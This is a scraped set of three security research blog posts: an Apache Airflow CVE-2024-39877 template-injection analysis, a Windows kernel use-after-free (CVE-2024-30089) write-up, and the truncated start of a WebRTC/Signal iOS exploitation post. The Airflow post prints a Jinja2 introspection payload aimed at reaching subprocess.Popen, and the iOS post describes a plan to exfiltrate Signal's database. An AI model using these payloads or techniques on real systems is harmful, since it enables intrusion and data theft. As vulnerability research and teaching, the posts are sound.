https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/,"   CVE-2024-39877: Apache Airflow Arbitrary Code Execution - Penetration Testing and CyberSecurity Solution - SecureLayer7                      Home Services PENETRATION TESTING Application Security Mobile Application Security Thick Client Penetration Testing VoIP Penetration Testing On Demand Penetration Testing CODE AUDIT Ethereum Smart Contract Audit Source Code Audit SECURITY EXPERTISE IoT Device Security ICO Security Web Malware Removal SAP Security Assessment Red Team Assessment CLOUD INFRASTRUCTURE AWS Security Assessment INFRASTRUCTURE SECURITY Network Security Server Hardening Wireless Security Assessment Firewall Configuration Review Telecom Network Security  Resources Resources Advisories Company About Management Careers Contact Us Home Services PENETRATION TESTING Application Security Mobile Application Security Thick Client Penetration Testing VoIP Penetration Testing On Demand Penetration Testing CODE AUDIT Ethereum Smart Contract Audit Source Code Audit SECURITY EXPERTISE IoT Device Security ICO Security Web Malware Removal SAP Security Assessment Red Team Assessment CLOUD INFRASTRUCTURE AWS Security Assessment INFRASTRUCTURE SECURITY Network Security Server Hardening Wireless Security Assessment Firewall Configuration Review Telecom Network Security  Resources Resources Advisories Company About Management Careers Contact Us   ✕   CVE-2024-39877: Apache Airflow Arbitrary Code ExecutionHome News CVE-2024-39877: Apache Airflow Arbitrary Code Execution  Polyfill Supply Chain AttackAugust 1, 2024A Guide To Web3 Penetration TestingAugust 2, 2024August 1, 2024 Apache Airflow is an open-source platform for programmatically authoring, scheduling, and monitoring workflows. While it offers robust features for managing complex workflows, it has experienced security vulnerabilities. One notable vulnerability, CVE-2024-39877, is the DAG (Directed Acyclic Graph) code execution vulnerability. This allows authenticated DAG authors to craft a doc_md parameter in a way that can execute arbitrary code in the scheduler context, which is prohibited according to the Airflow security model. Patch Diffing From the pull request on GitHub that patches the vulnerability, we can see that the DAG code execution vulnerability arises from improper handling of the doc_md parameter, which allows attackers to inject and execute arbitrary code within the scheduler context. The doc_md parameter in Airflow’s DAG allows for the inclusion of Markdown documentation. However, due to improper sanitization, as Jinja2 is used to render the content of this parameter, it is possible to inject Jinja2 templates that can execute arbitrary Python code. Since the Airflow scheduler processes this parameter, any code injected will run in the context of the scheduler. The vulnerability was patched by treating the data within the doc_md parameter as raw data. Testing Lab 1. We will build the lab on Docker. First, we need to pull the vulnerable image: airflow % docker pull apache/airflow:2.4.0 2. Then, download the Docker Compose file: airflow % curl -LfO ‘https://airflow.apache.org/docs/apache-airflow/2.4.0/docker-compose.yaml’ 3. Create the logs, dags, plugins, and config folders, and the .env file: airflow % mkdir -p ./dags ./logs ./plugins ./config && echo -e “AIRFLOW_UID=$(id -u)” > .env 4. Check the created directories and files: airflow % ls config  dags  docker-compose.yaml  logs  plugins 5. Initiate Airflow: airflow % sudo docker compose up airflow-init 6. Now, run Airflow: airflow % sudo docker compose up We can find it working on port 8080. Username and password are airflow:airflow. The Analysis Now, to reproduce the vulnerability, we need to create a DAG. What is a DAG? A Directed Acyclic Graph (DAG) is a finite graph with directed edges and no cycles. In the context of Apache Airflow, a DAG is a collection of all the tasks you want to run, organized in a way that reflects their relationships and dependencies. Directed: Each edge in the graph has a direction, going from one node (task) to another. Acyclic: There are no cycles in the graph, meaning that you cannot start at one task and follow the directed edges back to the same task. Graph: A collection of nodes (tasks) and edges (dependencies between tasks). DAGs in Apache Airflow In Apache Airflow, DAGs are defined in Python scripts, which specify the relationships and dependencies between tasks. Here are some key components: Tasks: The individual units of work, which can be anything from running a shell command to calling an API or running a machine learning model. Dependencies: The relationships between tasks, specifying which tasks need to be completed before others can start. Scheduling: Defines when and how often the DAG should run. DAG Example The following DAG includes a doc_md parameter. This parameter allows you to document your DAG using Markdown. The documentation will be visible in the Airflow web interface when you view the DAG details. from datetime import datetime from airflow import DAG from airflow.operators.empty import EmptyOperator default_args = {  'owner': 'airflow',  'start_date': datetime(2023, 1, 1),  'retries': 1 } # Define the DAG dag = DAG(  'example_dag_with_doc_md',  default_args=default_args,  description='An example DAG with doc_md',  schedule='@daily',  doc_md=""""""  # Example DAG  This is an example DAG that demonstrates the use of the `doc_md` parameter to add documentation.  ## Description  This DAG has two dummy tasks: `start` and `end`.  ## Tasks  - `start`: This is the starting task.  - `end`: This is the ending task.  ## Dependencies  The `end` task depends on the `start` task.  """""" ) # Define the tasks start = EmptyOperator(  task_id='start',  dag=dag ) end = EmptyOperator(  task_id='end',  dag=dag ) # Set the task dependencies start >> end doc_md: This parameter is used to add Markdown documentation to the DAG. The content within the doc_md string is written in Markdown and will be rendered in the Airflow web interface when you view the DAG details. EmptyOperator: This is a simple operator that does nothing. It is used here to create placeholder tasks. Now, Let’s Try Our DAG Save the DAG File Save the above code as a Python file (e.g., example_dag_with_doc_md.py) in the Airflow DAGs folder (/opt/airflow/dags/ in the case of our Docker setup). Trigger the DAG Go to the Airflow web interface and trigger the DAG named example_dag_with_doc_md. View Documentation Click on the DAG in the Airflow web interface to view its details. You will see the rendered Markdown documentation in the Doc tab. What Happened Here Exactly? Let’s take a look at the def get_doc_md(self, doc_md: str | None) -> str | None: function from the vulnerable code to see how it resolves the Markdown content from doc_md: def get_doc_md(self, doc_md: str | None) -> str | None:  if doc_md is None:   return doc_md  env = self.get_template_env(force_sandboxed=True)  if not doc_md.endswith("".md""):   template = jinja2.Template(doc_md)  else:   try:    template = env.get_template(doc_md)   except jinja2.exceptions.TemplateNotFound:    return f""""""    # Templating Error!    Not able to find the template file: `{doc_md}`.    """"""  return template.render() The get_doc_md method is designed to process the doc_md parameter, allowing DAG authors to embed Markdown documentation within their DAGs. Here’s a breakdown of how it works: 1. Check if doc_md is None: If doc_md is None, the function returns early. 2. Initialize Jinja2 Environment: It initializes a Jinja2 environment with sandboxing enabled using self.get_template_env(force_sandboxed=True). 3. Handle doc_md Content: If doc_md does not end with .md, it directly creates a Jinja2 template from the doc_md string using template = jinja2.Template(doc_md). This step is highly dangerous as it allows any string provided in doc_md to be treated as a Jinja2 template without any sanitization. If an attacker can manipulate this content, they can easily inject malicious Jinja2 expressions or even arbitrary Python code into the template. If doc_md ends with .md, the method attempts to load the template from the environment using env.get_template(doc_md). If the template file is not found, it returns a templating error message. However, this part is less critical than the direct template creation. 4. Render the Template: The final step template.render() executes the rendered template, which is where the injected code gets executed. So, the vulnerability is a classic example of an injection attack (Server-Side Template Injection, SSTI). Exploitation Let’s see how this vulnerability can be exploited: Attack Scenario Step-by-Step Breakdown 1. Send Malicious doc_md Payload: The attacker sends a malicious payload through the doc_md parameter to the web server. 2. Forward Payload to Airflow: The web server forwards this payload to the Airflow application, which then invokes the get_doc_md method. 3. Invoke get_doc_md Method: The method checks if the doc_md parameter is None and proceeds to initialize the Jinja2 environment. 4. Create Jinja2 Template: Next, it creates a Jinja2 template using the doc_md content and renders the template. During the rendering process, the malicious code embedded in the doc_md parameter is executed by the operating system (OS). 5. Execute Injected Code: The OS performs the command and returns the output to the Airflow application. 6. Send Response: Finally, Airflow sends the rendered template output back to the web server, which then delivers the response, including the command output, back to the attacker. Example of Injected Code To demonstrate this, let’s inject code to dump the available classes: doc_md=""""""  {{ ''.__class__.__mro__[1].__subclasses__() }}  """""" The {{ ”.__class__.__mro__[1].__subclasses__() }} in Jinja2 template code leverages Python’s introspection capabilities to list all subclasses of the object class, effectively revealing all classes loaded in the current Python environment. Here’s how it works: ”.__class__ retrieves the class of an empty string, which is str. Accessing .__mro__ on this class provides the method resolution order (MRO), a tuple that includes the str class itself and its base classes, including object. The expression .__mro__[1] selects the object class from this tuple. Finally, .__subclasses__() lists all known subclasses of the object class, allowing us to enumerate the classes available in the runtime. This can be used to identify useful classes like os.system to execute commands on the OS and achieve code execution. After updating the DAG, our injected expression got rendered and dumped all the available classes. Here, we can see that useful classes like subprocess.Popen can be used to execute commands. The exploitation depends on the environment and the availability of the classes. Conclusion In this analysis, we discovered the CVE-2024-39877 vulnerability, which allows authenticated DAG authors to exploit the doc_md parameter to execute arbitrary code in the scheduler context, violating Airflow’s security model. The vulnerability arises from improper handling and sanitization of the doc_md parameter, which is rendered using Jinja2 templates. This oversight allows attackers to inject malicious Jinja2 expressions that can execute Python code. The method get_doc_md in the vulnerable code initializes a Jinja2 environment and directly creates a template from the doc_md string if it does not end with .md, rendering the template without adequate sanitization. This process can be exploited by injecting payloads that leverage Python’s introspection capabilities to enumerate available classes and execute commands, thereby compromising the system. To mitigate this, the patch ensures proper handling of doc_md as raw data, preventing the execution of arbitrary code. Table of contentsPatch DiffingTesting LabThe AnalysisExploitationAttack ScenarioConclusion  Quick LinksHome About Blog News Contact Us ServicesApplication Security Network Security Mobile Application Security Thick Client Security VoIP Penetration Testing Security ExpertiseIoT Device Security ICO Security Web Malware Removal Red Teaming Assessment Network SecurityTelecom Security Assessment Server Hardening Wireless Security Assessment Firewall Configuration Review GeneralPrivacy Policy Disclaimer Agreement Terms of Use Usage Agreement  © 2024 SecureLayer7. All Rights Reserved.           Enable Notifications OK No thanks  "
https://securityintelligence.com/x-force/little-bug-that-could/,"  Racing round and round: The little bug that could                          Security Intelligence  News Topics X-Force Podcast  News Topics Threat Research Podcast   Search     Application Security Artificial Intelligence CISO Cloud Security Data Protection Endpoint Fraud Protection Identity & Access Incident Response Mainframe Network Risk Management Intelligence & Analytics Security Services Threat Hunting Zero Trust Infographic: Zero trust policy Timeline: Local Government Cyberattacks Industries Banking & Finance Energy & Utility Government Healthcare  View All Topics        News  Topics All Categories Application Security Identity & Access Artificial Intelligence Incident Response CISO Mainframe Cloud Security Mobile Security Data Protection Network Endpoint Risk Management Fraud Protection Threat Hunting Security Services Security Intelligence & Analytics Industries Banking & Finance Energy & Utility Government Healthcare  X-Force Podcast           Racing Round and Round: The Little Bug That Could     Light Dark  July 29, 2024 By Valentina Palmiotti 13 min read  Adversary Services Threat Hunting X-Force     The little bug that could: CVE-2024-30089 is a subtle kernel vulnerability I used to exploit a fully updated Windows 11 machine (with all Virtualization Based Security and hardware security mitigations enabled) and scored my first win at Pwn2Own this year. In this article, I outline my straightforward approach to bug hunting: picking a starting point and intuitively following a path until something catches my attention. This bug is interesting because it can be reliably triggered due to a logic error. The error occurs in a specific state within an inter-process communication system, which then causes a use-after-free. Finding the bug required comparing the program’s code paths across its various possible states, a process I describe in detail. Equally intriguing is the bug’s origin and Microsoft’s approach to patching it. These topics are also covered in this post. Hunting for 0-Days: Where to Start? A common question I receive about vulnerability research is how to get started. In fact, picking a target and sticking to it might be one of the most difficult steps of the research process. The vulnerability discussed here is in the Microsoft Kernel Streaming Service (mskssrv.sys). Check out this blog post to get a general overview of the subsystem. In that post, I pointed out some characteristics of the MSKSSRV subsystem that might make it a good attack surface, specifically its inter-process communications (IPC) mechanism. The code base of MSKSSRV is pretty small, and the last vulnerability in this subsystem I discovered was also independently exploited in the wild as a 0-day. I also heard about additional efforts from other researchers and companies to audit this driver. Because of this, I initially fell into the common trap of assuming there are no more bugs left to find in this attack surface. But, because I had suggested it in my previous blog post, I chose to trust my instincts and continue looking. Lock Lock: Who’s There? A great way to get new research ideas is by staying informed on current research. I read an excellent blog post by k0shl that sparked the inspiration to hunt for a particular type of bug. In the vulnerability found by k0shl, an object’s reference count is initialized and incremented without proper locking, creating a use after free window. Despite k0shl’s bug being a userland bug and not in the kernel, the coding style of the vulnerable library reminded me of when I previously audited the MSKSSRV driver. The MS KS Server (MSKSSRV) interacts with a userland process via FSStreamReg and FSContextReg objects. FSStreamReg and FSContextReg are both derived from the base FSRegObject class. I noticed that FSContextReg does not implement a locking vtable function, and the base class (FSRegObject) implementation is simply a nop instruction. This means no locking mechanism is actually implemented for FSContextReg objects. Conversely, FSStreamReg implements a locking function that utilizes a mutex. The locking mechanism is used when accessing the objects for cleanup, in the function FSRendezvousServer::Close: Code Block 1: FSRendezvousServer::Close, locking and unlocking path for FSRegObjects There are two objects derived from the FSRegObject base class, but one object type implements a proper locking mechanism and the other doesn’t. This was suspicious to me. To test my theory, I tried to trigger undefined behavior using references to the unprotected FSContextReg object. However, due to the locking protections on the global FSRendezvousServer object, which holds the pointers to the lists of FSRegObjects, I couldn’t manage to trigger anything interesting, despite the lack of lock protection on FSContextReg objects. Still, I could sense there was something “fishy” about the reference counting system for FSRegObjects. I just didn’t know what yet. IPC in MS KS Server As I mentioned in my last blog post, the inter-process object sharing aspect of MSKSSRV is an interesting avenue for vulnerabilities, so I decided to focus on it further. The IPC mechanism of the subsystem is illustrated in the following diagram: Diagram 1: Inter-process Communication in MS KS Server Opening a file handle to the MSKSSRV device, via CreateFile, creates a FILE_OBJECT that corresponds to that handle. Using that handle, a process can initialize a new stream or a context object by sending the device an IOCTL using the DeviceIoControl function. The initializing process designates which remote process can register the object by specifying the process ID via the lpInBuffer argument. The remote process, using a new file handle to the MSKSSRV device, can now register the object via device IOCTL. The pointer for the FSRegObject is stored in Irp->CurrentStackLocation->FileObject->FsContext2. The same pointer to the FSRegObject object is stored twice in FsContext2, once in the FILE_OBJECT used by the initializing process and once in the FILE_OBJECT used by the registering process. In this way, references to the FSRegObject object can be shared across processes. For example, using an FSStreamReg object, multiple processes can have access to stream frame buffer, as shown in Diagram 1. An FSRegObject’s reference count is initialized to 1 and then incremented again after initialization is complete. Registering the FSRegObject increases its reference count again, for a total of three references per object. Diagram 2: Initializing and Registering FSContextReg Objects Finding a Bug I decided to take another look at where I previously audited trying to look for locking vulnerabilities. I noticed the function FSRendezvousClose, which calls FSRendezvousServer::Close, is called within the driver’s dispatch cleanup and close function routines: Code Block 2: DispatchCleanup and DipatchCleanup routines for MS KS Server Driver A dispatch routine handles one or more types of IRPs, which are packaged I/O requests. In Windows, when all handle references to a file have been closed, the corresponding file system driver for the file receives an IRP_MJ_CLEANUP and an IRP_MJ_CLOSE request, which are handled by the driver’s DispatchCleanup and DispatchClose function routines. In MSKSSRV, FSRendezvousClose is called within both the driver’s DispatchCleanup and DispatchClose function routines, if the pointer stored in Irp->CurrentStackLocation->FileObject->FsContext2 is not NULL. Something that stood out to me in FSRendezvousServer::Close, which I had analyzed before, were the various checks on the caller’s process ID. Process context matters because all kernel mode code operates within a singular kernel address space, which is separate from user-mode address spaces. Each process has its own user-mode memory context, and the process context in which a kernel thread executes determines which process’ user-mode address space will be accessed if the thread accesses user addresses. The following code checks if the calling process is the initializing or registering process: Code Block 3: FSRendezvousServer::Close, Process checks on FSRegObjects Process specific information is stored in the FSRegObject stored in Irp->CurrentStackLocation->FileObject->FsContext2 at the time of initialization or registration. The driver determines which processes specific resources (EPROCESS objects, event objects, and other stuff) it needs to release by checking the caller’s process ID. If the process is the initializing or registering process, some additional cleanup is done for those process specific resources. This stood out to me because generally, all Dispatch routines execute in an arbitrary process context, with some exceptions. In other words, the system picks a thread to do the Dispatch work; what thread it picks is arbitrary. I discovered that DispatchCleanup is called in the process context of the process that closed the final handle. So, in this case, the process ID checks make sense. However, DispatchClose is called from an arbitrary process context. That means that if FSRendezvousServer::Close is called as a result of IRP_MJ_CLOSE request, it would be from an arbitrary process context, defeating the purpose of the process ID checks. This was a big clue that something was wrong here. Additionally, as a feature of the Windows OS, handles can be shared with other processes (by child process inheritance or using the DuplicateHandle API function). Via the shared file handle, the other process can also interact with the same FILE_OBJECT. Diagram 3: Sharing MS KS Server Device Handle Due to this, it is also possible that the process context during DispatchCleanup is neither the initialization process nor the registration process. If either of those handles are duplicated and shared to another process, and that process is the last to close the handle, DispatchCleanup will be called within the context of that foreign process (which is not the initializing or registering process). Diagram 4: Foreign Process Closing Last Handle to a FILE_OBJECT I noticed that the function FSRendezvousServer::Close could be called twice when a file handle is closed (once for the IRP_MJ_CLEANUP request and once for the IRP_MJ_CLOSE request, Code Block 2). Within that function there are two possible calls to FSRegObject::Release (Code Block 4), which dereferences the object and frees its memory if the reference count drops to 0. That means FSRegObject::Release could be called up to four times for a handle. Additionally, there are two file handles for which the FILE_OBJECT points to the same FSRegObject via the FSContext2 pointer. That means a possibility of calling FSRegObject::Release up to eight times on the same object, four for each handle. If the original reference count of the object is only three, there could be a possible use after free triggered by too many dereferences. That was my line of thinking, anyway. I knew the program structure would probably prevent hitting the theoretical maximum number of dereferences, but maybe not quite enough. At this point I felt I was on to something and decided to investigate this further. Code Block 4: FSRegObject::Release can be called twice from FSRendezvousServer::Close In general, more dereferences than there are references on an object is not the only way a use after free can occur. However in this case, we can be sure that if an FSRegObject has been freed, its reference count has dropped to zero. The last time a valid FSRegObject is accessed during the IRP_MJ_CLEANUP/CLOSE IRP requests is in a call to FSRegObject::Release. So, if a use-after-free is possible, a call to FSRegObject::Release will always occur after the object has already been freed. During the call, the object will be once again dereferenced. For that reason, counting the number of dereferences is a good heuristic to find use-after-frees for this particular case. The only thing left to do was to trace out the possible states of the program, taking note of when the object is freed and accessed. I did this by mentally emulating the program logic during IRP_MJ_CLEANUP/CLOSE requests, each beginning with the corresponding Dispatch functions (Code Block 2), for each of the possible cases. Shown below are the states based on which process closes the final reference to a handle. Each entry represents the number of dereferences of the FSContextReg object that occur if the corresponding process closes the final handle. Note: there is no functional difference between HANDLE #1 (initializing handle) and HANDLE #2 (registering handle), as the FileObject->FSContext2 field points to the same memory in both FILE_OBJECTs represented by the corresponding handles. FSContextReg dereferences for each of the possible MSKSSRV IPC states Success! The last state results in four dereferences: two by the foreign process and two by the initializing (and also registering) process, while only having three references initially, meaning a use after free is possible! I also repeated the same exercise with FSStreamReg objects, but due to a memory leak bug in the code, it’s actually not possible to ever free a FSStreamReg object after it’s been registered. The Vulnerability While doing the virtual machine brain exercise outlined above, I found the problem. If the process is the initializing process or registering process, the appropriate cleanup happens, and the pointer stored in Irp->CurrentStackLocation->FileObject->FsContext2 is set to NULL. The code block below shows where this occurs in the case the caller is the initializing process: Code Block 5: FSRegObject::CloseInitProcess sets FSContext pointer to NULL This means FSRendezvousClose will not be called again during the completion of the IRP_MJ_CLOSE request in DispatchClose (SrvDispatchClose, Code Block 2). However, if the calling process is a foreign process, no cleanup occurs and FSRegObject::Release is called once near the end of the function. Since FileObject->FsContext2 is not NULL, FSRendezvousServer::Close is called again during the subsequent IRP_MJ_CLOSE request and another call to FSRegObject::Release occurs. Now, if the second handle is closed by a process that both initialized and registered the FSContextReg object, the object will clean up all its stored process resources, making it empty. This causes FSRegObject::Release to be called twice within FSRendezvousServer::Close (Code Block 4). The extra dereference serves to account for the extra initializing reference once the object is empty. This makes for a total of four dereferences on a single FSContextReg object, indicating that a use after free occurs. Diagram 5: CVE-2024-30089 depicted The reader following along might wonder why then a foreign process can’t be the last one to close both handles, since this would seemingly also lead to four dereferences. Before the object is destructed and freed, it is unlinked from a list stored in the global FSRendezvousServer object. At the beginning of FSRendezvousServer::Close, the pointer in FSContext2 is checked to be a valid member of the list. In this case, the object is freed in the second call to FSRegObject::Release at the end of the function. During the fourth call to FSRendezvousServer::Close, the object has already been unlinked from the list, making it an invalid object, so it cannot be used. In order to trigger a use-after-free, it must occur after the object has been retrieved and validated in FSRendezvousServer::Close. The code snippet below shows the use-after-free primitive that can be obtained by the vulnerability: Code Block 6: UAF primitive path Attack Complexity In the security update guide for this vulnerability, the CVSS score indicates that “Exploitation [is] More Likely” and the attack complexity for this vulnerability is “Low”. While Microsoft does not provide detailed explanations for their scoring, I have noted some patterns while patch diffing other vulnerabilities. The vulnerability likely received this score because it stems from a logic error, making it reliably triggerable. By following the steps outlined in Diagram 5, an attacker can consistently trigger the use-after-free scenario depicted in Code Block 6. However, this doesn’t mean that exploiting it in practice is straightforward. A detailed walkthrough of the exploitation steps will be covered in the next part of this series. A Retrospective Understanding how a bug occurred is important for cultivating a proactive approach to secure development practices. To pinpoint how the vulnerability was introduced, I analyzed previous versions of the driver obtained from Winbindex and looked for any differences in logic in the FSRendezvousServer::Close function. In the vulnerability section, I mentioned that the ultimate cause of this bug was not setting Irp->CurrentStackLocation->FileObject->FsContext2 to NULL if the calling process is a foreign process. To my surprise, I saw this exact line of code in an early version of mskssrv.sys: Code Block 7: Early version of FSRendezvousServer::Close, FsContext2 is set to NULL In the code block shown above, FileObject->FsContext2 is explicitly set to NULL, regardless of the result of the preceding process ID checks. This prevents FSRendezvousServer::Close from being called again in the subsequent IRP_MJ_CLOSE request, so the extra dereference cannot occur. Weird — so why was this line of code taken out? Let’s take a look at a later version of the function, where the bug was first introduced: Code Block 8: FsContext set to NULL within a feature flag check Shown in the code block above is a check for the feature flag Feature_Servicing_TeamsUsingMediaFoundationCrashes. Feature flags are a component of Windows that toggle various functionality and experiments, though there is not much public information about them. In this previous blog post, we discuss how feature flags have been used for vulnerability patches. Feature flags are sometimes used to test out a functionality before it is officially adopted. In this case, if the Feature_Servicing_TeamsUsingMediaFoundationCrashes feature is enabled, FileObject->FsContext2 is not set to NULL, introducing the vulnerability. This feature was observed to be enabled by default on Windows 10 installations. In Windows 11 and as shown in Code Block 1, this feature flag conditional is not present and the pointer is not set to NULL, making it vulnerable as well. Due to the name of the feature, I looked into the functionality of Microsoft Teams, the video conferencing software. I confirmed that the application can use MSKSSRV functionality to share media streams across processes. It is possible that stream handle sharing was causing Teams to crash. An interesting topic for further research would be to examine how Teams shares MSKSSRV device handles across processes, and why performing proper pointer cleanup could cause the application to crash. The Patch This part of the series is focused on the vulnerability itself, which includes its patch. I was particularly interested in examining the patch for this bug, since my proposed fix seemed to trigger crashes in Microsoft Teams. It’s important to mention that at this point I have yet to examine how a real application uses the MSKSSRV driver in practice. Not having this context introduces blind spots into the understanding of why a system is designed the way it is. A complete patch for this bug would require some base code restructuring and could reveal more details about how the IPC system is intended to function. I was also hoping to glean some insight into secure coding practices from Microsoft developers. To my disappointment, the logic error that caused the vulnerability, which was patched in the June 2024 Security updates, was not addressed directly. Instead, an access token check was added before the vulnerable code paths. See the code below for the initialize context IOCTL, handled by the function FSRendezvousServer::InitializeContext: Code Block 9: IOCTL function begins with a feature flag check and checks if calling process is a frame server The function above begins by checking if a feature is enabled. This is likely the feature flag corresponding to the patch. If the feature is enabled, KsIsCurrentProcessFrameServer must return TRUE, otherwise NTSTATUS value STATUS_ACCESS_DENIED is returned. Let’s take a look at KsIsCurrentProcessFrameServer: Code Block 10: KsIsCurrentProcessFrameServer performing a SID check on the calling thread’s access token This function checks the calling thread’s token against two specific security identifiers (SIDs). The SIDs correspond to a token in group NT SERVICE\FrameServer. If either of the SIDs are enabled in the calling thread’s access token, then the vulnerable function code can execute. After seeing this, I suspected there likely was an Administrator to Kernel bug still present. Ultimately, the memory corruption problems were not addressed at all. I confirmed this by making a slight modification to my original exploit: An administrator user can start the FrameServer service, open a handle to the service and create the exploit process using the handle. I was able to obtain a full kernel R/W primitive on a fully patched system. While Microsoft does not consider Administrator to Kernel to be a security boundary, similar bugs have been used by threat actors to gain a kernel R/W primitive and use it for EDR blinding and rootkit operations. If you’re interested in what kind of things can be done with this primitive, check out my BlackHat talk alongside FuzzySec. Conclusion and Next Steps This post focused on the vulnerability research part of my Pwn2Own endeavor, which consisted of finding a 0-day kernel vulnerability that can be exploited for privilege escalation. This post outlines the journey: getting inspired by other research, failing to find a bug, picking a new angle, finding something suspicious, and then finally pinpointing where the vulnerability lives. Now that a bug has been identified and there’s a use-after-free primitive, the rest should be straightforward, right? Microsoft seems to think so, they rated this bug “Exploitation More Likely” with attack complexity “low”. Are they right? I’ll cover that, the exploitation strategy, and unveil the meaning of the series title, in the next part! References https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089 https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-36802.html https://whereisk0shl.top/post/isolate-me-from-sandbox-explore-elevation-of-privilege-of-cng-key-isolation https://www.osr.com/nt-insider/2017-issue2/handling-cleanup-close-cancel-wdf-driver/ https://www.csoonline.com/article/1311082/north-koreas-lazarus-deploys-rootkit-via-applocker-zero-day-flaw.html Acknowledgements Andréa Piazza, for the amazing diagrams Emma Kirkpatrick, for patiently explaining the Windows security model to me Common Vulnerabilities and Exposures | IBM X-Force Research | Microsoft | Windows | X-Force  Valentina Palmiotti Vulnerability and Exploit Researcher, Adversary Services, IBM X-Force   POPULAR            Risk Management              July 25, 2024      Unveiling the latest banking trojan threats in LATAM 9 min read - This post was made possible through the research contributions of Amir Gendler. In our most recent research in the Latin American (LATAM) region, we at IBM Security Lab have observed a surge in campaigns linked with malicious Chrome extensions. These…                  Risk Management              July 24, 2024      Crisis communication: What NOT to do 4 min read - Read the 1st blog in this series, Cybersecurity crisis communication: What to do When an organization experiences a cyberattack, tensions are high, customers are concerned and the business is typically not operating at full capacity. Every move you make at this…                  Incident Response              July 15, 2024      Cybersecurity crisis communication: What to do 4 min read - Cybersecurity experts tell organizations that the question is not if they will become the target of a cyberattack but when. Often, the focus of response preparedness is on the technical aspects — how to stop the breach from continuing, recovering…          More from Adversary Services           June 13, 2024              Q&A with Valentina Palmiotti, aka chompie       4 min read - The Pwn2Own computer hacking contest has been around since 2007, and during that time, there has never been a female to score a full win — until now.This milestone was reached at Pwn2Own 2024 in Vancouver, where two women, Valentina Palmiotti and Emma Kirkpatrick, each secured full wins by exploiting kernel vulnerabilities in Microsoft Windows 11. Prior to this year, only Amy Burnett and Alisa Esage had competed in the contest's 17-year history, with Esage achieving a partial win in…                 February 29, 2024              CVE-2023-20078 technical analysis: Identifying and triggering a command injection vulnerability in Cisco IP phones       7 min read - CVE-2023-20078 catalogs an unauthenticated command injection vulnerability in the web-based management interface of Cisco 6800, 7800, and 8800 Series IP Phones with Multiplatform Firmware installed; however, limited technical analysis is publicly available. This article presents my findings while researching this vulnerability. In the end, the reader should be equipped with the information necessary to understand and trigger this vulnerability.Vulnerability detailsThe following Cisco Security Advisory (Cisco IP Phone 6800, 7800, and 8800 Series Web UI Vulnerabilities - Cisco) details CVE-2023-20078 and…                 December 7, 2023              Exploiting GOG Galaxy XPC service for privilege escalation in macOS       7 min read - Being part of the Adversary Services team at IBM, it is important to keep your skills up to date and learn new things constantly. macOS security was one field where I decided to put more effort this year to further improve my exploitation and operation skills in macOS environments. During my research, I decided to try and discover vulnerabilities in software that I had pre-installed on my laptop, which resulted in the discovery of this vulnerability. In this article, I…          Topic updates          Get email updates and stay ahead of the latest threats to the security landscape, thought leadership and research.                      Subscribe today                Analysis and insights from hundreds of the brightest minds in the cybersecurity industry to help you prove compliance, grow business and stop threats. Cybersecurity News By Topic By Industry Exclusive Series X-Force Podcast Events Contact About Us Follow us on social       © 2024 IBM Contact Privacy Terms of use Accessibility Cookie Preferences  Sponsored by            si-icon-eightbarfeature    "
https://margin.re/2024/07/you-cant-spell-webrtc-without-rce-part-2/,"           You Can't Spell WebRTC without RCE - Part 2 — Margin Research         About Services Resources Blog  Contact    You Can't Spell WebRTC without RCE - Part 2         Home Blog You Can't Spell WebRTC without RCE - Part 2  You Can't Spell WebRTC without RCE - Part 2 by Ian Dupont Jul 26, 2024         This is the second part in our three-part series on exploring WebRTC, Signal-iOS, and iOS exploitation. The first post in this series surveyed WebRTC's implementation of various protocols, injected arbitrary read and arbitrary write vulnerabilities, and set up a research environment to trigger the vulnerabilities. This post continues our research and covers the following topics:Breaking ASLR with sequential leaksLimitations of Xcode’s iOS simulatorSetting up Corellium for iOS emulation and exploit developmentLocating and exfiltrating Signal's databaseStack pivoting and ARM64 ROP chainsWe’ll start where we left off with triggering the vulnerabilities and end with full RCE!Part 2 - Leveraging Vulnerabilities for iOS ExploitationWe concluded the first blog post by triggering an arbitrary write at unmapped memory and crashing the app. This achieves a denial of service but does not demonstrate the true power of our arbitrary read and write primitives. Instead, we want to harness these vulnerabilities to invoke remote code execution (RCE) and do something meaningful. Let's set our goal as leaking data from Signal's database back to our attacking device.The first step in this process is hijacking execution. There are a variety of strategies for this, such as spoofing C++/Objective-C classes or vtables to trigger unexpected behavior. But for this example, let’s use a tried and true method: hijacking a pushed instruction pointer on the stack to trigger a Return-Oriented Programming (ROP) chain.The hurdle with this approach is that we need a reliable stack address, and right now all we have is a leaked RTCPReceiver heap address. We must find a bridge from this WebRTC object instance to the process's stack.Breaking ASLRLet’s briefly discuss the iOS shared cache before going any further, as it is imperative to iOS exploitation and our goal of linking heap and stack addresses. Like most modern operating systems, iOS relies on a set of core functionalities to run its apps. Much of this functionality is defined in libraries packaged into the shared cache. This cache is loaded as a block of memory to improve performance, meaning there is a single “slide” (randomization) applied to all contained libraries. This is ideal from an attacker’s perspective, as breaking Address Space Layout Randomization (ASLR) for a single shared cache library thereby bypasses randomization for all contained libraries.Also, because of its size and broad functionality, the shared cache contains basically any ROP gadget an exploit developer could need. We rely heavily on it for our ROP chain.The shared cache changes for every version of iOS, meaning a real-world exploit would fingerprint the system and dynamically adapt to the target version. Fingerprinting is not included in our example exploit as we only seek to demonstrate RCE against a single, known target. Our target is an iPhone 14 Pro running iOS 16.4 (20E247)We can fetch the target firmware and extract the shared cache using Blacktop’s ipsw tool. Download and extract using the following commands:ipsw download --device iPhone15,2 --build 20E247 ipsw ipsw extract --dyld iPhone15,2_16.4_20E247_Restore.ipsw # extracts the shared cache Adam Wolf maintains a useful list of device names to device ID translations in this gist.ipsw also extracts individual libraries from the shared cache, which is useful as we dig into library internals and search for ROP gadgets. We can extract the libdyld.dylib library, used in the next section, using the following command:cd 20E247__iPhone15,2 && ipsw dyld macho -x dyld_shared_cache_arm64e libdyld.dylib Leaking the Stack(s)Our current goal is finding a stack address that we can overwrite with a ROP payload to hijack execution using only the leaked RTCPReceiver heap address. Stack addresses are rarely stored in heap objects but may be referenced in shared libraries. For instance, the core glibc library on Linux stores the address of the process environment variable strings, located on the stack, in its __environ symbol. iOS has similar process environment symbols in its shared cache, specifically the _NXArgv, ___progname, _environ, and _NXArgc variables in the libdyld.dylib library. Testing showed _NXArgv reliably pointed to the main thread’s stack!Now we need a bridge from the C++ object’s heap address to the shared cache. C++ classes maintain references to their 